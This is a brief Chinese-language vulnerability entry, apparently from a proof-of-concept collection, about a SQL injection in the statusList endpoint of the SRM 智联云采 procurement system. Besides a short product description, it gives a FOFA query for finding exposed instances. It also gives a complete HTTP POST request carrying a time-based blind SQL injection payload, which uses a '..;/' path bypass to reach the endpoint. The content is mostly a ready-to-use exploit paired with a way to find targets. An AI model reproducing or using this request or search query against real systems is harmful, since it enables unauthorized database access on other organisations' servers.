# SRM智联云采系统statusList存在SQL注入漏洞
智互联(深圳)科技有限公司SRM智联云采系统针对企业供应链管理难题，及智能化转型升级需求，智联云采依托人工智能、物联网、大数据、云等技术，通过软硬件系统化方案，帮助企业实现供应商关系管理和采购线上化、移动化、智能化，提升采购和协同效率，进而规避供需风险，强化供应链整合能力，构建企业利益共同体。智互联(深圳)科技有限公司SRM智联云采系统statusList存在SQL注入漏洞。

## fofa
```javascript
title=="SRM 2.0"
```

## poc
```java
POST /adpweb/static/..;/a/sys/sysMessage/statusList?companyName=1&officeName=1&orderBy=1&receiverName=1&sourceMessageId=1&delStatus=1%20AND%20(SELECT%207104%20FROM%20(SELECT(SLEEP(3)))xZoa) HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
```

![image-20241122151355129](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411221513193.png)

